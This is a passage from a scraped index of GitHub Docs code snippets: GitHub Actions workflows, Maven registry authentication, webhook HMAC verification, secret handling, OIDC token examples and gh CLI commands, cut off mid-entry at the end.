https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer dry-run gitlab --output-dir tmp/dry-run --namespace my-gitlab-namespace --project my-gitlab-project\n```\n\n----------------------------------------\n\nTITLE: Configuring settings.xml for GitHub Packages authentication (Subdomain Isolation Enabled)\nDESCRIPTION: This XML snippet configures the `settings.xml` file for Apache Maven to authenticate with GitHub Packages when subdomain isolation is enabled. It defines active profiles, repositories, and server credentials, including the GitHub username and personal access token (PAT). Replace USERNAME with your GitHub username, TOKEN with your PAT, OWNER with the repository owner, and REPOSITORY with the repository name.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-apache-maven-registry.md#_snippet_0\n\nLANGUAGE: xml\nCODE:\n```\n<settings xmlns=\"http://maven.apache.org/SETTINGS/1.0.0\"\n  xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n  xsi:schemaLocation=\"http://maven.apache.org/SETTINGS/1.0.0\n                      http://maven.apache.org/xsd/settings-1.0.0.xsd\">\n\n  <activeProfiles>\n    <activeProfile>github</activeProfile>\n  </activeProfiles>\n\n  <profiles>\n    <profile>\n      <id>github</id>\n      <repositories>\n        <repository>\n          <id>central</id>\n          <url>https://repo1.maven.org/maven2</url>\n        </repository>\n        <repository>\n          <id>github</id>\n          <url>https://{% ifversion fpt or ghec %}maven.pkg.github.com{% else %}maven.HOSTNAME{% endif %}/OWNER/REPOSITORY</url>\n          <snapshots>\n            <enabled>true</enabled>\n          </snapshots>\n        </repository>\n      </repositories>\n    </profile>\n  </profiles>\n\n  <servers>\n    <server>\n      <id>github</id>\n      <username>USERNAME</username>\n      <password>TOKEN</password>\n    </server>\n  </servers>\n</settings>\n```\n\n----------------------------------------\n\nTITLE: Verifying Webhook Signature with Python\nDESCRIPTION: This Python code snippet defines a `verify_signature` function that validates the webhook payload by comparing the calculated SHA256 HMAC hash with the `x-hub-signature-256` header. It utilizes the `hmac` and `hashlib` modules. The function takes the payload body, secret token, and signature header as input. It encodes the secret token to UTF-8 before using it for HMAC calculation. It uses `hmac.compare_digest` for secure comparison to prevent timing attacks. If the signatures don't match or the header is missing, it raises an HTTPException with a 403 status code.\nSOURCE: https://github.com/github/docs/blob/main/content/webhooks/using-webhooks/validating-webhook-deliveries.md#_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nimport hashlib\nimport hmac\ndef verify_signature(payload_body, secret_token, signature_header):\n    \"\"\"Verify that the payload was sent from GitHub by validating SHA256.\n\n    Raise and return 403 if not authorized.\n\n    Args:\n        payload_body: original request body to verify (request.body())\n        secret_token: GitHub app webhook token (WEBHOOK_SECRET)\n        signature_header: header received from GitHub (x-hub-signature-256)\n    \"\"\"\n    if not signature_header:\n        raise HTTPException(status_code=403, detail=\"x-hub-signature-256 header is missing!\")\n    hash_object = hmac.new(secret_token.encode('utf-8'), msg=payload_body, digestmod=hashlib.sha256)\n    expected_signature = \"sha256=\" + hash_object.hexdigest()\n    if not hmac.compare_digest(expected_signature, signature_header):\n        raise HTTPException(status_code=403, detail=\"Request signatures didn't match!\")\n```\n\n----------------------------------------\n\nTITLE: Workflow to retrieve and decode a Base64 secret\nDESCRIPTION: This workflow retrieves a Base64 encoded secret, decodes it, and saves it to a file. It checks out the repository, retrieves the secret from the environment, and uses `base64 --decode` to decode the secret into a `.der` file. The final step demonstrates how to use the decoded file with `openssl`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions.md#_snippet_22\n\nLANGUAGE: yaml\nCODE:\n```\nname: Retrieve Base64 secret\non:\n  push:\n    branches: [ octo-branch ]\njobs:\n  decode-secret:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Retrieve the secret and decode it to a file\n        env:\n          {% raw %}CERTIFICATE_BASE64: ${{ secrets.CERTIFICATE_BASE64 }}{% endraw %}\n        run: |\n          echo $CERTIFICATE_BASE64 | base64 --decode > cert.der\n      - name: Show certificate information\n        run: |\n          openssl x509 -in cert.der -inform DER -text -noout\n```\n\n----------------------------------------\n\nTITLE: Using labels to control runner selection (Linux)\nDESCRIPTION: This YAML snippet demonstrates how to use labels within the `runs-on` key of a GitHub Actions workflow to target a specific runner with the `ubuntu-20.04-16core` label.  The workflow checks the version of bats. It uses actions for checkout and node setup, and then installs and runs bats.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/using-github-hosted-runners/using-larger-runners/running-jobs-on-larger-runners.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: learn-github-actions\non: [push]\njobs:\n  check-bats-version:\n    runs-on:\n      labels: ubuntu-20.04-16core\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: '14'\n      - run: npm install -g bats\n      - run: bats -v\n```\n\n----------------------------------------\n\nTITLE: Installing Dependencies with npm install\nDESCRIPTION: This example shows how to install dependencies using `npm install`. This command installs the dependencies defined in the `package.json` file.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-nodejs.md#_snippet_5\n\nLANGUAGE: YAML\nCODE:\n```\nsteps:\n- uses: {% data reusables.actions.action-checkout %}\n- name: Use Node.js\n  uses: {% data reusables.actions.action-setup-node %}\n  with:\n    node-version: '20.x'\n- name: Install dependencies\n  run: npm install\n```\n\n----------------------------------------\n\nTITLE: Node.js CI Workflow Template\nDESCRIPTION: This workflow template defines a CI pipeline for Node.js projects. It triggers on push and pull requests to the main branch, runs on Ubuntu, and uses a matrix strategy to test against multiple Node.js versions. It includes steps to checkout code, set up Node.js, install dependencies, build, and run tests.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-nodejs.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\nname: Node.js CI\n\non:\n  push:\n    branches: [ \"main\" ]\n  pull_request:\n    branches: [ \"main\" ]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n\n    strategy:\n      matrix:\n        node-version: [18.x, 20.x]\n        # See supported Node.js release schedule at https://nodejs.org/en/about/releases/\n\n    steps:\n    - uses: {% data reusables.actions.action-checkout %}\n    - name: Use Node.js {% raw %}${{ matrix.node-version }}{% endraw %}\n      uses: {% data reusables.actions.action-setup-node %}\n      with:\n        node-version: {% raw %}${{ matrix.node-version }}{% endraw %}\n        cache: 'npm'\n    - run: npm ci\n    - run: npm run build --if-present\n    - run: npm test\n```\n\n----------------------------------------\n\nTITLE: Using Artifact Data in Triggered Workflow (YAML/JavaScript)\nDESCRIPTION: This YAML workflow is triggered by the completion of 'Upload data' workflow. It downloads the `pr_number` artifact, extracts the pull request number, and then uses the GitHub REST API via a GitHub Script action to add a comment to the pull request.  It uses JavaScript within the action to accomplish the API interaction, file handling, and data extraction.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_60\n\nLANGUAGE: YAML\nCODE:\n```\nname: Use the data\n\non:\n  workflow_run:\n    workflows: [Upload data]\n    types:\n      - completed\n\njobs:\n  download:\n    runs-on: ubuntu-latest\n    steps:\n      - name: 'Download artifact'\n        uses: {% data reusables.actions.action-github-script %}\n        with:\n          script: |\n            let allArtifacts = await github.rest.actions.listWorkflowRunArtifacts({\n               owner: context.repo.owner,\n               repo: context.repo.repo,\n               run_id: context.payload.workflow_run.id,\n            });\n            let matchArtifact = allArtifacts.data.artifacts.filter((artifact) => {\n              return artifact.name == \"pr_number\"\n            })[0];\n            let download = await github.rest.actions.downloadArtifact({\n               owner: context.repo.owner,\n               repo: context.repo.repo,\n               artifact_id: matchArtifact.id,\n               archive_format: 'zip',\n            });\n            const fs = require('fs');\n            const path = require('path');\n            const temp = '{% raw %}${{ runner.temp }}{% endraw %}/artifacts';\n            if (!fs.existsSync(temp)){\n              fs.mkdirSync(temp);\n            }\n            fs.writeFileSync(path.join(temp, 'pr_number.zip'), Buffer.from(download.data));\n\n      - name: 'Unzip artifact'\n        run: unzip pr_number.zip -d \"{% raw %}${{ runner.temp }}{% endraw %}/artifacts\"\n\n      - name: 'Comment on PR'\n        uses: {% data reusables.actions.action-github-script %}\n        with:\n          github-token: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n          script: |\n            const fs = require('fs');\n            const path = require('path');\n            const temp = '{% raw %}${{ runner.temp }}{% endraw %}/artifacts';\n            const issue_number = Number(fs.readFileSync(path.join(temp, 'pr_number')));\n            await github.rest.issues.createComment({\n              owner: context.repo.owner,\n              repo: context.repo.repo,\n              issue_number: issue_number,\n              body: 'Thank you for the PR!'\n            });\n```\n\n----------------------------------------\n\nTITLE: Share Data Between Jobs Using Artifacts in GitHub Actions (YAML)\nDESCRIPTION: This YAML snippet illustrates how to pass data between jobs in a workflow using the `upload-artifact` and `download-artifact` actions.  It demonstrates a workflow with three jobs: one that calculates a value and uploads it as an artifact, one that downloads the artifact, performs another calculation, and uploads the result, and a third that downloads the final result and prints it. The `needs` keyword ensures the jobs run in sequence. Versioning is handled using conditional logic with ifversion, ensuring compatibility between different GitHub Enterprise Server versions. Different artifact names are used depending on the `artifacts-v3-deprecation` version.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/storing-and-sharing-data-from-a-workflow.md#_snippet_4\n\nLANGUAGE: YAML\nCODE:\n```\nname: Share data between jobs\n\non: [push]\n\njobs:\n  job_1:\n    name: Add 3 and 7\n    runs-on: ubuntu-latest\n    steps:\n      - shell: bash\n        run: |\n          expr 3 + 7 > math-homework.txt\n      - name: Upload math result for job 1\n        uses: {% data reusables.actions.action-upload-artifact %}\n        with:\n          name: {% ifversion artifacts-v3-deprecation %}homework_pre{% else %}homework{% endif %}\n          path: math-homework.txt\n\n  job_2:\n    name: Multiply by 9\n    needs: job_1\n    runs-on: windows-latest\n    steps:\n      - name: Download math result for job 1\n        uses: {% data reusables.actions.action-download-artifact %}\n        with:\n          name: {% ifversion artifacts-v3-deprecation %}homework_pre{% else %}homework{% endif %}\n      - shell: bash\n        run: |\n          value=`cat math-homework.txt`\n          expr $value \\* 9 > math-homework.txt\n      - name: Upload math result for job 2\n        uses: {% data reusables.actions.action-upload-artifact %}\n        with:\n          name: {% ifversion artifacts-v3-deprecation %}homework_final{% else %}homework{% endif %}\n          path: math-homework.txt\n\n  job_3:\n    name: Display results\n    needs: job_2\n    runs-on: macOS-latest\n    steps:\n      - name: Download math result for job 2\n        uses: {% data reusables.actions.action-download-artifact %}\n        with:\n          name: {% ifversion artifacts-v3-deprecation %}homework_final{% else %}homework{% endif %}\n      - name: Print the final result\n        shell: bash\n        run: |\n          value=`cat math-homework.txt`\n          echo The result is $value\n```\n\n----------------------------------------\n\nTITLE: Defining Secrets for Reusable Workflows\nDESCRIPTION: This YAML snippet shows how to define secrets for a reusable workflow using `on.workflow_call.secrets`. It specifies that the workflow requires an `access-token` secret, which is passed from the caller workflow. The secret can then be used by actions or nested workflows within the called workflow.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  workflow_call:\n    secrets:\n      access-token:\n        description: 'A token passed from the caller workflow'\n        required: false\n\njobs:\n\n  pass-secret-to-action:\n    runs-on: ubuntu-latest\n    steps:\n    # passing the secret to an action\n      - name: Pass the received secret to an action\n        uses: ./.github/actions/my-action\n        with:\n          token: ${{ secrets.access-token }}\n\n  # passing the secret to a nested reusable workflow\n  pass-secret-to-workflow:\n    uses: ./.github/workflows/my-workflow\n    secrets:\n       token: ${{ secrets.access-token }}\n```\n\n----------------------------------------\n\nTITLE: Concurrency with Cancellation YAML\nDESCRIPTION: This YAML snippet configures concurrency with the `cancel-in-progress` option. This ensures that any currently running job or workflow in the same concurrency group ('production' in this case) is cancelled when a new workflow is triggered. This helps in scenarios where only the latest deployment should be active.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/deploying-with-github-actions.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nname: Deployment\n\nconcurrency:\n  group: production\n  cancel-in-progress: true\n\non:\n  push:\n    branches:\n      - main\n\njobs:\n  deployment:\n    runs-on: ubuntu-latest\n    environment: production\n    steps:\n      - name: deploy\n        # ...deployment-specific steps\n```\n\n----------------------------------------\n\nTITLE: Creating a Pull Request using gh CLI\nDESCRIPTION: This snippet demonstrates how to create a pull request using the `gh pr create` command in the GitHub CLI. It includes options for assigning the pull request, specifying base and head branches, adding a title and body, marking as draft, adding labels and milestones, adding to a project, adding reviewers, and opening in a web browser.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh pr create\n```\n\n----------------------------------------\n\nTITLE: Using Queries and Suites in QL Packs\nDESCRIPTION: This YAML snippet demonstrates using specific queries and query suites within a CodeQL workflow. It uses the `queries` parameter to specify a built-in suite (`security-extended`) and the `external-repository-token` parameter to provide access to queries in private repositories. The token needs access to checkout the private repository.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/customizing-your-advanced-setup-for-code-scanning.md#_snippet_11\n\nLANGUAGE: yaml\nCODE:\n```\n- uses: {% data reusables.actions.action-codeql-action-init %}\n  with:\n    # Comma-separated list of queries / packs / suites to run.\n    # This may include paths or a built in suite, for example:\n    # security-extended or security-and-quality.\n    queries: security-extended\n    # Optional. Provide a token to access queries stored in private repositories.\n    external-repository-token: {% raw %}${{ secrets.ACCESS_TOKEN }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Setting repository secret via GitHub CLI\nDESCRIPTION: This snippet demonstrates how to set a repository secret using the GitHub CLI. The `gh secret set` command prompts for the secret value. It requires the GitHub CLI to be installed and authenticated with the appropriate permissions.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh secret set SECRET_NAME\n```\n\n----------------------------------------\n\nTITLE: Printing Context Information to Log in GitHub Actions\nDESCRIPTION: This YAML configuration demonstrates how to print the contents of various GitHub Actions contexts to the log for debugging. It uses the `toJSON` function to format the context objects into a readable JSON format before printing them using `echo`. Each context (github, job, steps, runner, strategy, matrix) is dumped into the log as environment variables.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\nname: Context testing\non: push\n\njobs:\n  dump_contexts_to_log:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Dump GitHub context\n        env:\n          GITHUB_CONTEXT: ${{ toJson(github) }}\n        run: echo \"$GITHUB_CONTEXT\"\n      - name: Dump job context\n        env:\n          JOB_CONTEXT: ${{ toJson(job) }}\n        run: echo \"$JOB_CONTEXT\"\n      - name: Dump steps context\n        env:\n          STEPS_CONTEXT: ${{ toJson(steps) }}\n        run: echo \"$STEPS_CONTEXT\"\n      - name: Dump runner context\n        env:\n          RUNNER_CONTEXT: ${{ toJson(runner) }}\n        run: echo \"$RUNNER_CONTEXT\"\n      - name: Dump strategy context\n        env:\n          STRATEGY_CONTEXT: ${{ toJson(strategy) }}\n        run: echo \"$STRATEGY_CONTEXT\"\n      - name: Dump matrix context\n        env:\n          MATRIX_CONTEXT: ${{ toJson(matrix) }}\n        run: echo \"$MATRIX_CONTEXT\"\n```\n\n----------------------------------------\n\nTITLE: Example restore-keys usage\nDESCRIPTION: This YAML snippet demonstrates using multiple `restore-keys` with the cache action in GitHub Actions. The keys are searched in sequential order, from most specific to least specific. Partial matches of the `restore-keys` are also considered, returning the most recently created cache.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/caching-dependencies-to-speed-up-workflows.md#_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nrestore-keys: |\n  npm-feature-${{ hashFiles('package-lock.json') }}\n  npm-feature-\n  npm-\n```\n\n----------------------------------------\n\nTITLE: Creating an error annotation using the error command in PowerShell\nDESCRIPTION: This snippet shows how to create an error annotation in a GitHub Actions workflow using the `error` command in PowerShell.  It's analogous to the Bash example but uses the `Write-Output` cmdlet.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\n      - name: Create annotation for build error\n        run: Write-Output \"::error file=app.js,line=1::Missing semicolon\"\n```\n\n----------------------------------------\n\nTITLE: Defining service containers in GitHub Actions\nDESCRIPTION: This snippet demonstrates how to define a service container (PostgreSQL) within a GitHub Actions workflow. It specifies the image, environment variables, ports, and health check options for the service. The workflow then uses this service to run tests against a Ruby application.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-circleci-to-github-actions.md#_snippet_5\n\nLANGUAGE: YAML\nCODE:\n```\nname: Containers\n\non: [push]\n\njobs:\n  build:\n\n    runs-on: ubuntu-latest\n    container: circleci/ruby:2.6.3-node-browsers-legacy\n\n    env:\n      PGHOST: postgres\n      PGUSER: administrate\n      RAILS_ENV: test\n\n    services:\n      postgres:\n        image: postgres:10.1-alpine\n        env:\n          POSTGRES_USER: administrate\n          POSTGRES_DB: ruby25\n          POSTGRES_PASSWORD: \"\"\n        ports:\n          - 5432:5432\n        # Add a health check\n        options: --health-cmd pg_isready --health-interval 10s --health-timeout 5s --health-retries 5\n\n    steps:\n      # This Docker file changes sets USER to circleci instead of using the default user, so we need to update file permissions for this image to work on GH Actions.\n      # See https://docs.github.com/actions/using-github-hosted-runners/about-github-hosted-runners#docker-container-filesystem\n\n      - name: Setup file system permissions\n        run: sudo chmod -R 777 $GITHUB_WORKSPACE /github /__w/_temp\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Install dependencies\n        run: bundle install --path vendor/bundle\n      - name: Setup environment configuration\n        run: cp .sample.env .env\n      - name: Setup database\n        run: bundle exec rake db:setup\n      - name: Run tests\n        run: bundle exec rake\n```\n\n----------------------------------------\n\nTITLE: OIDC Token Example with Reusable Workflows\nDESCRIPTION: This YAML snippet shows an example of an OIDC token generated during a workflow run that includes a reusable workflow. The token contains standard claims about the calling workflow, along with a custom `job_workflow_ref` claim that provides information about the called workflow. It includes the token type, algorithm, key ID, and various claims such as subject, audience, repository, run ID, actor, workflow, and the issuer.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-hardening-your-deployments/using-openid-connect-with-reusable-workflows.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n{\n  \"typ\": \"JWT\",\n  \"alg\": \"RS256\",\n  \"x5t\": \"example-thumbprint\",\n  \"kid\": \"example-key-id\"\n}\n{\n  \"jti\": \"example-id\",\n  \"sub\": \"repo:octo-org/octo-repo:environment:prod\",\n  \"aud\": \"{% ifversion ghes %}https://HOSTNAME{% else %}https://github.com{% endif %}/octo-org\",\n  \"ref\": \"refs/heads/main\",\n  \"sha\": \"example-sha\",\n  \"repository\": \"octo-org/octo-repo\",\n  \"repository_owner\": \"octo-org\",\n  \"actor_id\": \"12\",\n  \"repository_id\": \"74\",\n  \"repository_owner_id\": \"65\",\n  \"run_id\": \"example-run-id\",\n  \"run_number\": \"10\",\n  \"run_attempt\": \"2\",\n  \"actor\": \"octocat\",\n  \"workflow\": \"example-workflow\",\n  \"head_ref\": \"\",\n  \"base_ref\": \"\",\n  \"event_name\": \"workflow_dispatch\",\n  \"ref_type\": \"branch\",\n  \"job_workflow_ref\": \"octo-org/octo-automation/.github/workflows/oidc.yml@refs/heads/main\",\n  \"iss\": \"{% ifversion ghes %}https://HOSTNAME/_services/token{% else %}https://token.actions.githubusercontent.com{% endif %}\",\n  \"nbf\": 1632492967,\n  \"exp\": 1632493867,\n  \"iat\": 1632493567\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Workflow Inputs in YAML\nDESCRIPTION: This YAML snippet demonstrates how to define custom input properties for a `workflow_dispatch` event in a GitHub Actions workflow. It defines `logLevel`, `tags`, and `environment` inputs with descriptions, required status, default values, and types. When triggering the workflow manually, users are prompted to provide values for these inputs.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_53\n\nLANGUAGE: YAML\nCODE:\n```\non:\n  workflow_dispatch:\n    inputs:\n      logLevel:\n        description: 'Log level'\n        required: true\n        default: 'warning'\n        type: choice\n        options:\n        - info\n        - warning\n        - debug\n      tags:\n        description: 'Test scenario tags'\n        required: false\n        type: boolean\n      environment:\n        description: 'Environment to run tests against'\n        type: environment\n        required: true\n\njobs:\n  log-the-inputs:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          echo \"Log level: $LEVEL\"\n          echo \"Tags: $TAGS\"\n          echo \"Environment: $ENVIRONMENT\"\n        env:\n          LEVEL: {% raw %}${{ inputs.logLevel }}{% endraw %}\n          TAGS: {% raw %}${{ inputs.tags }}{% endraw %}\n          ENVIRONMENT: {% raw %}${{ inputs.environment }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Decrypting secret with gpg in a shell script\nDESCRIPTION: This shell script decrypts the encrypted secret file using `gpg` and the passphrase stored as a GitHub Actions secret. It creates a directory for secrets, decrypts the file, and outputs it to a specified path. The `--batch` and `--yes` flags are used to prevent interactive prompts.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions.md#_snippet_16\n\nLANGUAGE: shell\nCODE:\n```\n#!/bin/sh\n\n# Decrypt the file\nmkdir $HOME/secrets\n# --batch to prevent interactive command\n# --yes to assume \"yes\" for questions\ngpg --quiet --batch --yes --decrypt --passphrase=\"$LARGE_SECRET_PASSPHRASE\" \\\n--output $HOME/secrets/my_secret.json my_secret.json.gpg\n```\n\n----------------------------------------\n\nTITLE: Rewriting SQL to Reduce Deadlock Chance\nDESCRIPTION: This SQL snippet revises the previous transaction to reduce the chance of deadlocks by ensuring updates are performed in a consistent order and minimizing the time the transaction holds locks. It updates the rows in a specific order. No external dependencies.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/refactoring-code/fixing-database-deadlocks-or-data-integrity-issues.md#_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nBEGIN TRANSACTION;\n-- Update the rows in a consistent order\nUPDATE my_table SET value = 'Another value' WHERE id = 127;\nUPDATE my_table SET value = 'Some value' WHERE id = 301;\n-- Simulate a process taking 5 seconds:\nWAITFOR DELAY '00:00:05';\nCOMMIT TRANSACTION;\n```\n\n----------------------------------------\n\nTITLE: Authenticating with Image Registries for Service Containers\nDESCRIPTION: This YAML snippet demonstrates how to provide credentials for service containers to authenticate with Docker Hub and GitHub Container Registry (GHCR).  It includes the `credentials` keyword, referencing secrets stored in the repository settings. This allows using images from private registries or increasing Docker Hub rate limits. Ports mapping are also shown in the redis service.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/using-containerized-services/about-service-containers.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  build:\n    services:\n      redis:\n        # Docker Hub image\n        image: redis\n        ports:\n          - 6379:6379\n        credentials:\n          username: ${{ secrets.dockerhub_username }}\n          password: ${{ secrets.dockerhub_password }}\n      db:\n        # Private registry image\n        image: ghcr.io/octocat/testdb:latest\n        credentials:\n          username: ${{ github.repository_owner }}\n          password: ${{ secrets.ghcr_password }}\n```\n\n----------------------------------------\n\nTITLE: Making scripts executable in GitHub Actions workflow\nDESCRIPTION: This snippet shows how to ensure scripts are executable within a GitHub Actions workflow. It checks out the repository, sets a default working directory, makes the script files executable using `chmod +x`, and then executes the scripts.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/adding-scripts-to-your-workflow.md#_snippet_2\n\nLANGUAGE: YAML\nCODE:\n```\njobs:\n  example-job:\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        working-directory: ./scripts\n    steps:\n      - name: Check out the repository to the runner\n        uses: {% data reusables.actions.action-checkout %}  \n      - name: Make the script files executable\n        run: chmod +x my-script.sh my-other-script.sh\n      - name: Run the scripts\n        run: |\n          ./my-script.sh\n          ./my-other-script.sh\n```\n\n----------------------------------------\n\nTITLE: Configuring workflow to run on pushes and pull requests - YAML\nDESCRIPTION: This YAML snippet configures a GitHub Actions workflow to run on pushes to the `main` branch and on pull requests targeting the `main` branch.  This ensures that code scanning runs when changes are pushed to the main branch and when pull requests are opened against it, addressing permission issues related to Dependabot.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/troubleshooting-code-scanning/resource-not-accessible.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  push:\n    branches:\n      - main\n  pull_request:\n    branches:\n      - main\n```\n\n----------------------------------------\n\nTITLE: Workflow with Environment Approval - YAML\nDESCRIPTION: This workflow shows how to use an environment that requires approval before a job can run. The `publish` job will only run after the `build` job completes and after all rules for the `production` environment, including required reviewers, pass. This ensures manual approval before deploying to production.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/triggering-a-workflow.md#_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  push:\n    branches:\n      - main\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - name: build\n        run: |\n          echo 'building'\n\n  publish:\n    needs: [build]\n    runs-on: ubuntu-latest\n    environment: production\n    steps:\n      - name: publish\n        run: |\n          echo 'publishing'\n```\n\n----------------------------------------\n\nTITLE: Configure Release Notes with YAML\nDESCRIPTION: This YAML configuration file defines how release notes are automatically generated. It specifies labels and authors to exclude globally, as well as custom categories based on labels.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/releasing-projects-on-github/automatically-generated-release-notes.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n# .github/release.yml\n\nchangelog:\n  exclude:\n    labels:\n      - ignore-for-release\n    authors:\n      - octocat\n  categories:\n    - title: Breaking Changes 🛠\n      labels:\n        - Semver-Major\n        - breaking-change\n    - title: Exciting New Features 🎉\n      labels:\n        - Semver-Minor\n        - enhancement\n    - title: Other Changes\n      labels:\n        - \"*\"\n```\n\n----------------------------------------\n\nTITLE: Package workflow data as artifacts\nDESCRIPTION: This snippet demonstrates how to upload test results as artifacts after a workflow completes. It runs tests with the dotnet CLI, saves results to a directory, and uploads the directory using the `upload-artifact` action. The upload is configured to always run, even if tests fail.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-net.md#_snippet_6\n\nLANGUAGE: YAML\nCODE:\n```\nname: dotnet package\n\non: [push]\n\njobs:\n  build:\n\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        dotnet-version: [ '3.1.x', '6.0.x' ]\n\n      steps:\n        - uses: {% data reusables.actions.action-checkout %}\n        - name: Setup dotnet\n          uses: {% data reusables.actions.action-setup-dotnet %}\n          with:\n            dotnet-version: {% raw %}${{ matrix.dotnet-version }}{% endraw %}\n        - name: Install dependencies\n          run: dotnet restore\n        - name: Test with dotnet\n          run: dotnet test --no-restore --logger trx --results-directory {% raw %}\"TestResults-${{ matrix.dotnet-version }}\"{% endraw %}\n        - name: Upload dotnet test results\n          uses: {% data reusables.actions.action-upload-artifact %}\n          with:\n            name: {% raw %}dotnet-results-${{ matrix.dotnet-version }}{% endraw %}\n            path: {% raw %}TestResults-${{ matrix.dotnet-version }}{% endraw %}\n          # Use always() to always run this step to publish test results when there are test failures\n          if: {% raw %}${{ always() }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Dependency Review Action Workflow\nDESCRIPTION: This YAML snippet defines the basic dependency review workflow. It sets up the workflow to run on pull requests to the `main` branch. It checks out the repository and runs the dependency review action.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/supply-chain-security/understanding-your-software-supply-chain/customizing-your-dependency-review-action-configuration.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: 'Dependency review'\non:\n  pull_request:\n    branches: [ \"main\" ]\n\npermissions:\n  contents: read\n\njobs:\n  dependency-review:\n    runs-on: ubuntu-latest\n    steps:\n      - name: 'Checkout repository'\n        uses: {% data reusables.actions.action-checkout %}\n      - name: 'Dependency Review'\n        uses: actions/dependency-review-action@v4\n```\n\n----------------------------------------\n\nTITLE: Defining a Basic CI Workflow Template in YAML\nDESCRIPTION: This YAML snippet defines a basic Continuous Integration (CI) workflow template. It triggers on push and pull request events to the default branch. The workflow runs on an Ubuntu runner and executes a simple echo command.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-workflow-templates-for-your-organization.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: Octo Organization CI\n\non:\n  push:\n    branches: [ $default-branch ]\n  pull_request:\n    branches: [ $default-branch ]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n\n      - name: Run a one-line script\n        run: echo Hello from Octo Organization\n```\n\n----------------------------------------\n\nTITLE: Handling Rate Limit Errors with Retry in Octokit\nDESCRIPTION: This snippet defines a function `request_retry` to handle rate limit errors by retrying the request after waiting for the rate limit to reset. It checks 